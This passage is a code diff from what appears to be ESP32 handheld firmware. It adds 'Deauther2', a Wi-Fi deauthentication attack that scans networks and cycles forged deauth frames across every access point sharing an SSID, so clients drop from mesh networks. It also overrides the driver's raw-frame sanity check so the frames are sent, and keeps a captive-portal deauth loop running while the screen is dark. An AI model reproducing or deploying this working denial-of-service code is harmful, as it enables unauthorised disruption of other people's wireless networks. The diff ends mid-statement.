+  s_ssidSrc = EEPROM.read(SSID_SRC_ADDR);
+  if (s_ssidSrc > 2) s_ssidSrc = 0;
+  cpApplySsidSource(false);
+  Serial.printf("[portal] pagina: %s | nome (%s): %s\n",
+                cpPageSourceLabel().c_str(),
+                s_ssidSrc == 0 ? "Std" : (s_ssidSrc == 1 ? "Custom" : "Clone"),
+                custom_ssid);
+  cpLogHeap("cportalSetup fim");
+
+  // Feature enters STOPPED; the user presses SELECT to start the portal.
 
   drawMainMenu();
   setupTouchscreen();
@@ -4624,11 +5969,39 @@ void cportalLoop() {
     return;
   }
 
+  if (s_sleeping) {
+    // Tela apagada: nao desenha NADA, mas o portal continua atendendo.
+    if (attackActive) {
+      dnsServer.processNextRequest();
+      server.handleClient();
+
+      unsigned long now = millis();
+      if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
+        cpSendDeauthFrame();
+        cp_last_deauth_time = now;
+      }
+    }
+    cpSleepTick();
+
+    // Somente o CIMA responde. Os outros sao lidos e descartados para nao
+    // acumular borda (mesmo padrao usado no resto do firmware).
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    (void)isButtonPressedEdge(BTN_SELECT);
+    if (isButtonPressedEdge(BTN_UP)) {
+      cpSleepWake();
+      cportalLastBtnMs = millis();
+    }
+    return;
+  }
+
   maintainTouchNavBar();
   tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
 
   cportalHandleMainNavButtons();
   cportalHandleCredNavButtons();
+  cportalHandleConfigNavButtons();
   updateStatusBar();
   runUI();
 
@@ -4740,7 +6113,15 @@ static void deautherOpenTarget(int index) {
   drawAttackScreen();
 }
 
+// Diagnostic: counts how many times the sanity-check override is actually
+// invoked by the WiFi driver's raw-TX path. If this stays 0 while the deauth
+// runs, the core's internal copy is still rejecting our frames (override not
+// taking effect). If it increments, the override is live and any remaining
+// drop is elsewhere (channel / PMF / frame content).
+volatile uint32_t g_sanity_check_calls = 0;
+
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    g_sanity_check_calls++;
     return 0;
 }
 
@@ -4761,8 +6142,8 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     if (now - s_lastLog >= 1000) {
         wifi_mode_t mode;
         esp_err_t gm = esp_wifi_get_mode(&mode);
-        Serial.printf("[deauth] tx res=%d mode=%d (gm=%d) pkt=%u ok=%u fail=%u\n",
-                      res, (int)mode, gm, packet_count, success_count, consecutive_failures);
+        Serial.printf("[deauth] tx res=%d mode=%d (gm=%d) sanity=%u pkt=%u ok=%u fail=%u\n",
+                      res, (int)mode, gm, g_sanity_check_calls, packet_count, success_count, consecutive_failures);
         s_lastLog = now;
     }
 #endif
@@ -4773,7 +6154,7 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;   // reason code = 7 (Class 3 frame from nonassociated STA)
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
@@ -5351,6 +6732,827 @@ void deautherLoop() {
       }
   }
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Deauther2 — separate copy of the WiFi 2.4GHz Deauther with one addition:
+// when a network name has multiple access points (mesh / roaming), it can
+// send deauthentication frames to ALL of them, cycling through the group so
+// the client drops regardless of which node it is associated with. The
+// original Deauther is left untouched. Shares the ieee80211 sanity-check
+// override already defined in namespace Deauther above.
+// ─────────────────────────────────────────────────────────────────────────────
+namespace Deauther2 {
+
+#define SCREEN_WIDTH  240
+#define SCREEN_HEIGHT 320
+
+#define DEAUTH2_MAX_GROUP 16   // max nodes attacked at once by SSID group
+#define DEAUTH2_MAX_UNIQUE 32  // max unique SSIDs shown in the scan list
+
+static unsigned long deautherLastButtonPress = 0;
+static const unsigned long deautherDebounceTime = 200;
+
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+
+static int deautherNetworksPerPage() {
+  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
+}
+
+static void deautherUpdateNavLabels(bool onAttackScreen);
+void drawScanScreen();
+void drawAttackScreen();
+
+uint8_t deauth_frame_default[26] = {
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00,
+    0x01, 0x00
+};
+uint8_t deauth_frame[sizeof(deauth_frame_default)];
+
+uint32_t packet_count = 0;
+uint32_t success_count = 0;
+uint32_t consecutive_failures = 0;
+bool attack_running = false;
+wifi_ap_record_t selectedAp;
+uint8_t selectedChannel;
+int selected_ap_index = -1;
+int network_count = 0;
+wifi_ap_record_t *ap_list = nullptr;
+bool scanning = false;
+uint32_t last_packet_time = 0;
+int current_page = 0;
+int currentIndex = 0;
+
+// Group attack state: every AP whose SSID matches the selected network.
+wifi_ap_record_t groupTargets[DEAUTH2_MAX_GROUP];
+int groupTargetCount = 0;
+int groupTargetIndex = 0;
+bool attackGroup = false;   // true = cycle through the whole same-SSID group
+int groupSelectedIndex = 0; // cursor: which node [THIS ONLY] targets (persists across mode toggles)
+int nodeScrollOffset = 0;   // first node shown in the attack-screen window
+
+// Deduplicated scan view: one list entry per unique SSID (hidden networks stay
+// separate). dedupIndex[d] holds the ap_list index of the strongest AP for the
+// d-th unique SSID; dedupCount is how many unique entries the list shows.
+int dedupIndex[DEAUTH2_MAX_UNIQUE];
+int dedupCount = 0;
+
+static void buildDedupView() {
+  dedupCount = 0;
+  for (int i = 0; i < network_count && dedupCount < DEAUTH2_MAX_UNIQUE; i++) {
+    if (ap_list[i].ssid[0] == '\0') {
+      // Hidden network: no SSID to group by, keep it as its own entry.
+      dedupIndex[dedupCount++] = i;
+      continue;
+    }
+    bool seen = false;
+    for (int j = 0; j < dedupCount; j++) {
+      if (strcmp((char*)ap_list[dedupIndex[j]].ssid, (char*)ap_list[i].ssid) == 0) {
+        seen = true;
+        break;
+      }
+    }
+    if (!seen) {
+      dedupIndex[dedupCount++] = i;
+    }
+  }
+}
+
+static void deautherUpdateNavLabels(bool onAttackScreen) {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  // Lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
+  // Tela de ataque: LEFT=Back, SELECT=Start/Stop, RIGHT=Modo (grupo/nó).
+  if (onAttackScreen) {
+    const bool hasGroup = (groupTargetCount > 1);
+    setTouchNavLabels("Back",
+                      hasGroup ? "Node+" : nullptr,
+                      attack_running ? "Stop" : "Start",
+                      hasGroup ? "Node-" : nullptr,
+                      "Modo");
+  } else {
+    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
+  }
+  redrawTouchButtonBar();
+}
+
+static int countSameSsid(const char* ssid) {
+  // Hidden networks (empty SSID) are distinct APs, not a real "group" — never
+  // count them as duplicates.
+  if (ssid == nullptr || ssid[0] == '\0') return 1;
+  int n = 0;
+  for (int i = 0; i < network_count; i++) {
+    if (ap_list[i].ssid[0] != '\0' && strcmp((char*)ap_list[i].ssid, ssid) == 0) n++;
+  }
+  return n;
+}
+
+static void deautherDrawApRow(int apIdx, int rowNum, int y, bool isSel) {
+  char buf[64];
+  char ssid[16];
+  const int dup = countSameSsid((char*)ap_list[apIdx].ssid);
+  const char* src = (char*)ap_list[apIdx].ssid;
+
+  // SSID hard-truncated to 12 chars so full names like "Adrastea_IoT" still
+  // fit beside the fixed "xN" marker column, keeping every row aligned.
+  // Longer names lose only the tail (e.g. "Adrastea_Gue" for "Adrastea_Guest").
+  strncpy(ssid, src, 12);
+  ssid[12] = '\0';
+
+  char mark[4] = "";
+  if (dup > 1) {
+    snprintf(mark, sizeof(mark), "x%d", dup);
+  }
+
+  const char* enc = ap_list[apIdx].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
+  snprintf(buf, sizeof(buf), "%02d: %-12s %-2s %3d dBm Ch%2d %s",
+           rowNum + 1, ssid, mark, ap_list[apIdx].rssi, ap_list[apIdx].primary, enc);
+
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
+  tft.print(isSel ? ">" : " ");
+  tft.setCursor(10, y);
+  tft.setTextColor(isSel ? ORANGE : (ap_list[apIdx].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
+  tft.println(buf);
+}
+
+static void deautherOpenTarget(int index) {
+  // `index` is a deduplicated list index (0..dedupCount-1).
+  if (index < 0 || index >= dedupCount) {
+    return;
+  }
+  const int apIdx = dedupIndex[index];
+  currentIndex = index;
+  selected_ap_index = apIdx;
+  selectedAp = ap_list[apIdx];
+  selectedChannel = ap_list[apIdx].primary;
+
+  // Build the same-SSID group. Default to "attack all" when there are dupes.
+  // Hidden networks (empty SSID) are never grouped.
+  groupTargetCount = 0;
+  if (ap_list[apIdx].ssid[0] != '\0') {
+    for (int i = 0; i < network_count && groupTargetCount < DEAUTH2_MAX_GROUP; i++) {
+      if (ap_list[i].ssid[0] != '\0' &&
+          strcmp((char*)ap_list[i].ssid, (char*)ap_list[apIdx].ssid) == 0) {
+        groupTargets[groupTargetCount++] = ap_list[i];
+      }
+    }
+  }
+  attackGroup = (groupTargetCount > 1);
+  groupTargetIndex = 0;
+  groupSelectedIndex = 0;
+  nodeScrollOffset = 0;
+
+  drawAttackScreen();
+}
+
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
+  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+  packet_count++;
+  if (res == ESP_OK) {
+    success_count++;
+    consecutive_failures = 0;
+  } else {
+    consecutive_failures++;
+  }
+  Serial.printf("[d2] tx res=%d ok=%u/%u\n", (int)res, success_count, packet_count);
+}
+
+void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
+  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  memcpy(&deauth_frame[10], ap_record->bssid, 6);
+  memcpy(&deauth_frame[16], ap_record->bssid, 6);
+  deauth_frame[24] = 7;   // reason code = 7 (Class 3 frame from nonassociated STA)
+  Serial.printf("[d2] ch=%u bssid=%02X:%02X:%02X:%02X:%02X:%02X\n",
+                chan, ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+                ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+}
+
+int compare_ap(const void *a, const void *b) {
+  wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
+  wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
+  return ap2->rssi - ap1->rssi;
+}
+
+void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    deautherUpdateNavLabels(selected_ap_index >= 0);
+    return;
+  }
+
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+
+  if (leftButton && leftButton[0]) {
+    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
+  }
+  if (prevButton && prevButton[0]) {
+    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  }
+  if (nextButton && nextButton[0]) {
+    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+  }
+}
+
+void drawScanScreen() {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+
+  if (scanning) {
+    tft.setCursor(10, 50);
+    tft.setTextColor(GREEN);
+    tft.println("Scanning.");
+    loading(100, ORANGE, 0, 0, 3, true);
+    tft.setCursor(10, 65);
+    tft.println("Wait a moment.");
+    return;
+  }
+
+  if (dedupCount == 0) {
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    tft.println("No networks found.");
+    tft.setCursor(10, 65);
+    tft.println("Press Rescan.");
+  } else {
+    const int perPage = deautherNetworksPerPage();
+    if (currentIndex < 0) {
+      currentIndex = 0;
+    }
+    if (currentIndex >= dedupCount) {
+      currentIndex = max(0, dedupCount - 1);
+    }
+    current_page = currentIndex / max(1, perPage);
+
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, LIST_HEADER_Y);
+    tft.println("Networks:");
+
+    char page_buf[20];
+    snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
+             current_page + 1, max(1, (dedupCount + perPage - 1) / perPage));
+    tft.setCursor(180, LIST_HEADER_Y);
+    tft.setTextColor(GREEN);
+    tft.println(page_buf);
+
+    int y = LIST_FIRST_ROW_Y;
+    const int start_index = current_page * perPage;
+    const int end_index = min(start_index + perPage, dedupCount);
+    for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
+      deautherDrawApRow(dedupIndex[i], i, y, i == currentIndex);
+      y += LIST_ROW_H;
+    }
+  }
+
+  drawTabBar("Rescan", false, "Prev", currentIndex <= 0, "Next",
+             currentIndex >= dedupCount - 1);
+}
+
+bool scanNetworks() {
+  scanning = true;
+  current_page = 0;
+  currentIndex = 0;
+  drawScanScreen();
+
+  network_count = WifiScan::staWifiScanSync();
+  if (network_count <= 0) {
+    scanning = false;
+    return false;
+  }
+
+  if (ap_list) free(ap_list);
+  ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
+  if (!ap_list) {
+    scanning = false;
+    return false;
+  }
+
+  for (int i = 0; i < network_count; i++) {
+    wifi_ap_record_t ap_record = {0};
+    memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
+    strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+    ap_record.rssi = WiFi.RSSI(i);
+    ap_record.primary = WiFi.channel(i);
+    ap_record.authmode = WiFi.encryptionType(i);
+    ap_list[i] = ap_record;
+  }
+
+  qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
+
+  buildDedupView();
+
+  scanning = false;
+  return true;
+}
+
+static void deautherEnsureApOnChannel(uint8_t channel) {
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_start();
+  WiFi.softAP(".", nullptr, channel, 1, 4);
+  esp_wifi_set_promiscuous(true);
+  delay(100);
+}
+
+bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
+  const int n = WifiScan::staWifiScanSync();
+  for (int i = 0; i < n; i++) {
+    if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
+      *channel = WiFi.channel(i);
+      deautherEnsureApOnChannel(*channel);
+      return true;
+    }
+  }
+
+  deautherEnsureApOnChannel(selectedChannel);
+  return false;
+}
+
+void resetWifi() {
+  esp_wifi_stop();
+  delay(200);
+  esp_wifi_start();
+  delay(200);
+  packet_count = 0;
+  success_count = 0;
+  consecutive_failures = 0;
+}
+
+static void deautherMoveNodeSelection(int delta) {
+  if (groupTargetCount <= 1) return;
+  groupSelectedIndex = (groupSelectedIndex + delta + groupTargetCount) % groupTargetCount;
+  const int VISIBLE = 4;
+  if (groupSelectedIndex < nodeScrollOffset) nodeScrollOffset = groupSelectedIndex;
+  if (groupSelectedIndex >= nodeScrollOffset + VISIBLE) nodeScrollOffset = groupSelectedIndex - VISIBLE + 1;
+  if (nodeScrollOffset < 0) nodeScrollOffset = 0;
+  selectedAp = groupTargets[groupSelectedIndex];
+  selectedChannel = groupTargets[groupSelectedIndex].primary;
+}
+
+void drawAttackScreen() {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+
+  char buf[64];
+  tft.setTextColor(WHITE);
+  snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
+  tft.setCursor(10, 45);
+  tft.println(buf);
+
+  if (groupTargetCount > 1) {
+    snprintf(buf, sizeof(buf), "Mode: [%s]  Nodes: %d",
+             attackGroup ? "ALL" : "THIS ONLY", groupTargetCount);
+    tft.setTextColor(attackGroup ? ORANGE : WHITE);
+    tft.setCursor(10, 60);
+    tft.println(buf);
+
+    // Node window (up to 4 rows, scrolls to keep the cursor visible).
+    const int VISIBLE = 4;
+    int y = 75;
+    for (int k = 0; k < VISIBLE && nodeScrollOffset + k < groupTargetCount; k++) {
+      const int idx = nodeScrollOffset + k;
+      const bool sel = (idx == groupSelectedIndex) && !attackGroup;
+      snprintf(buf, sizeof(buf), "%c %d: %02X:%02X:%02X:%02X:%02X:%02X ch%d %d",
+               sel ? '>' : ' ',
+               idx + 1,
+               groupTargets[idx].bssid[0], groupTargets[idx].bssid[1],
+               groupTargets[idx].bssid[2], groupTargets[idx].bssid[3],
+               groupTargets[idx].bssid[4], groupTargets[idx].bssid[5],
+               groupTargets[idx].primary, groupTargets[idx].rssi);
+      tft.setCursor(10, y);
+      tft.setTextColor(sel ? ORANGE : (attackGroup ? UI_DIM_TEXT : WHITE));
+      tft.println(buf);
+      y += 15;
+    }
+  } else {
+    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
+             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
+    tft.setCursor(10, 60);
+    tft.setTextColor(WHITE);
+    tft.println(buf);
+  }
+
+  const char* auth;
+  switch (selectedAp.authmode) {
+    case WIFI_AUTH_OPEN: auth = "OPEN"; break;
+    case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
+    case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
+    case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
+    default: auth = "Unknown"; break;
+  }
+  snprintf(buf, sizeof(buf), "Auth: %s", auth);
+  tft.setCursor(10, 140);
+  tft.setTextColor(WHITE);
+  tft.println(buf);
+
+  tft.setCursor(10, 155);
+  tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
+  tft.println(attack_running ? "Status: Running" : "Status: Stopped");
+
+  float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
+  snprintf(buf, sizeof(buf), "Packets: %u  %.0f%%", packet_count, success_rate);
+  tft.setCursor(10, 170);
+  tft.setTextColor(WHITE);
+  tft.println(buf);
+
+  snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
+  tft.setCursor(10, 185);
+  tft.println(buf);
+
+  const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
+  drawTabBar(buttons[0], false, "", true, buttons[1], false);
+}
+
+static void deautherHandleNavButtons() {
+  const unsigned long now = millis();
+  if (now - deautherLastButtonPress < deautherDebounceTime) {
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    (void)isButtonPressedEdge(BTN_SELECT);
+    return;
+  }
+
+  // Tela de ataque (View): LEFT volta pra lista, SELECT inicia/para,
+  // RIGHT alterna entre "atacar todas" e "só este nó".
+  if (selected_ap_index >= 0) {
+    if (isButtonPressedEdge(BTN_LEFT)) {
+      attack_running = false;
+      last_packet_time = 0;
+      selected_ap_index = -1;
+      drawScanScreen();
+      deautherLastButtonPress = now;
+      return;
+    }
+    if (isButtonPressedEdge(BTN_SELECT)) {
+      attack_running = !attack_running;
+      if (attack_running) {
+        deautherEnsureApOnChannel(selectedChannel);
+      } else {
+        last_packet_time = 0;
+      }
+      drawAttackScreen();
+      deautherLastButtonPress = now;
+      return;
+    }
+    if (isButtonPressedEdge(BTN_RIGHT)) {
+      if (groupTargetCount > 1) {
+        attackGroup = !attackGroup;
+        groupTargetIndex = 0;
+        drawAttackScreen();
+        deautherLastButtonPress = now;
+      }
+      return;
+    }
+    if (groupTargetCount > 1 && !attackGroup) {
+      if (isButtonPressedEdge(BTN_UP)) {
+        deautherMoveNodeSelection(-1);
+        drawAttackScreen();
+        deautherLastButtonPress = now;
+        return;
+      }
+      if (isButtonPressedEdge(BTN_DOWN)) {
+        deautherMoveNodeSelection(1);
+        drawAttackScreen();
+        deautherLastButtonPress = now;
+        return;
+      }
+    }
+    return;
+  }
+
+  if (scanning) {
+    return;
+  }
+
+  // Lista de scan: LEFT sai, UP/DOWN movem, RIGHT rescaneia, SELECT abre.
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    feature_exit_requested = true;
+    deautherLastButtonPress = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
+    currentIndex--;
+    drawScanScreen();
+    deautherLastButtonPress = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_DOWN) && currentIndex < dedupCount - 1) {
+    currentIndex++;
+    drawScanScreen();
+    deautherLastButtonPress = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_RIGHT)) {
+    if (scanNetworks()) {
+      drawScanScreen();
+    }
+    deautherLastButtonPress = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_SELECT) && dedupCount > 0) {
+    deautherOpenTarget(currentIndex);
+    deautherLastButtonPress = now;
+  }
+}
+
+void handleTouch() {
+  int x, y;
+  if (!readTouchXY(x, y)) return;
+
+  static unsigned long lastTouchActionMs = 0;
+  const unsigned long now = millis();
+  if (now - lastTouchActionMs < 300) {
+    return;
+  }
+
+  bool redraw = false;
+  if (selected_ap_index == -1) {
+    const int listMaxY = LIST_FIRST_ROW_Y + (deautherNetworksPerPage() * LIST_ROW_H);
+    if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && dedupCount > 0) {
+      int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * deautherNetworksPerPage());
+      if (index >= 0 && index < dedupCount) {
+        deautherOpenTarget(index);
+        lastTouchActionMs = now;
+      }
+    } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
+      if (x >= 0 && x <= 57) {
+        drawButton(0, 304, 57, 16, "Rescan", true, false);
+        if (scanNetworks()) {
+          drawScanScreen();
+        }
+        lastTouchActionMs = now;
+        redraw = true;
+      } else if (x >= 122 && x <= 179 && currentIndex > 0) {
+        drawButton(117, 304, 57, 16, "Prev", true, false);
+        currentIndex--;
+        drawScanScreen();
+        lastTouchActionMs = now;
+        redraw = true;
+      } else if (x >= 183 && x <= 240 && currentIndex < dedupCount - 1) {
+        drawButton(178, 304, 57, 16, "Next", true, false);
+        currentIndex++;
+        drawScanScreen();
+        lastTouchActionMs = now;
+        redraw = true;
+      }
+    }
+  } else {
+    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
+      if (x >= 0 && x <= 57) {
+        drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
+        attack_running = !attack_running;
+        if (attack_running) {
+          deautherEnsureApOnChannel(selectedChannel);
+        } else {
+          last_packet_time = 0;
+        }
+        drawAttackScreen();
+        lastTouchActionMs = now;
+        redraw = true;
+      } else if (x >= 183 && x <= 240) {
+        drawButton(177, 304, 57, 16, "Back", true, false);
+        attack_running = false;
+        last_packet_time = 0;
+        selected_ap_index = -1;
+        drawScanScreen();
+        lastTouchActionMs = now;
+        redraw = true;
+      }
+    }
+  }
+
+  if (redraw) {
+    delay(50);
+  }
+}
+
+static bool uiDrawn = false;
+
+void runUI() {
+#define SCREEN_WIDTH  240
+#define SCREENHEIGHT 320
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+
+  static const unsigned char* icons[ICON_NUM] = {
+    bitmap_icon_undo,
+    bitmap_icon_go_back
+  };
+
+  if (!uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+  static unsigned long lastSpamTime = 0;
+
+  switch (animationState) {
+    case 0:
+      break;
+
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 3:
+      switch (activeIcon) {
+        case 0:
+          scanNetworks();
+          delay(50);
+          if (scanNetworks()) {
+            drawScanScreen();
+          }
+          animationState = 0;
+          activeIcon = -1;
+          break;
+      }
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  const unsigned long touchCheckInterval = 50;
+
+  if (millis() - lastTouchCheck >= touchCheckInterval) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+void deauther2Setup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  deautherUpdateNavLabels(false);
+  featureClearContent(TFT_BLACK);
+
+  setupTouchscreen();
+  uiDrawn = false;
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  redrawTouchButtonBar();
+  runUI();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextColor(GREEN, BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(10, 50);
+  tft.println("Initializing...");
+
+  attack_running     = false;
+  selected_ap_index  = -1;
+  current_page       = 0;
+  currentIndex       = 0;
+  scanning           = false;
+  groupTargetCount   = 0;
+  groupTargetIndex   = 0;
+  attackGroup        = false;
+  groupSelectedIndex = 0;
+  nodeScrollOffset   = 0;
+
+  if (!WifiScan::loadApListFromWifiCache(&ap_list, &network_count, compare_ap)) {
+    scanNetworks();
+  }
+  buildDedupView();
+
+  drawScanScreen();
+  drawScanScreen();
+  redrawTouchButtonBar();
+}
+
+void deauther2Loop() {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  deautherHandleNavButtons();
+  handleTouch();
+  updateStatusBar();
+  runUI();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  uint32_t current_time = millis();
+  if (attack_running && selected_ap_index != -1) {
+    uint32_t heap = ESP.getFreeHeap();
+    if (heap < 30000) {
+      attack_running = false;
+      last_packet_time = 0;
+      drawAttackScreen();
+      delay(3000);
+      return;
+    }
+
+    if (consecutive_failures > 10) {
+      resetWifi();
+      last_packet_time = 0;
+      delay(3000);
+      return;
+    }
+
+    if (current_time - last_packet_time >= 100 && attack_running) {
+      if (attackGroup && groupTargetCount > 1) {
+        // Round-robin across every node that shares the SSID.
+        groupTargetIndex = (groupTargetIndex + 1) % groupTargetCount;
+        wsl_bypasser_send_deauth_frame(&groupTargets[groupTargetIndex],
+                                       groupTargets[groupTargetIndex].primary);
+      } else {
+        wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
+      }
+      last_packet_time = current_time;
+    }
+  }
+
+  static uint32_t last_channel_check = 0;
+  if (attack_running && current_time - last_channel_check > 15000) {
+    uint8_t new_channel;
+    if (checkApChannel(selectedAp.bssid, &new_channel)) {
+      if (new_channel != selectedChannel) {
+        selectedChannel = new_channel;
+        wifi_config_t ap_config = {0};
+        strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = strlen("ESP32-DIV");
+        ap_config.ap.password[0] = '\0';
+        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        ap_config.ap.ssid_hidden = 1;
+        ap_config.ap.max_connection = 4;
+        ap_config.ap.beacon_interval = 100;
+        ap_config.ap.channel = selectedChannel;
